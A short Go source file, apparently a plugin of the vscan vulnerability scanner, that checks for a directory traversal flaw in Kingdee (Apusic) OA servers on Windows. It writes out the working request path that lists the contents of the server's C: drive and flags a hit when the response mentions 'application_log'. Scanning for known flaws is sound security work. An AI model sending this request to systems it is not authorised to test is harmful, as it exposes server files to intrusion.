package apusic

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

//win金蝶OA server_file 目录遍历漏洞

func Win_server_file(u string) bool {
	if req, err := pkg.HttpRequset(u+"/appmonitor/protected/selector/server_file/files?folder=C://&suffix=", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "application_log") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln win金蝶OA server_file 目录遍历漏洞 |%s\n", u+"/appmonitor/protected/selector/server_file/files?folder=C://&suffix="))
			return true
		}
	}
	return false
}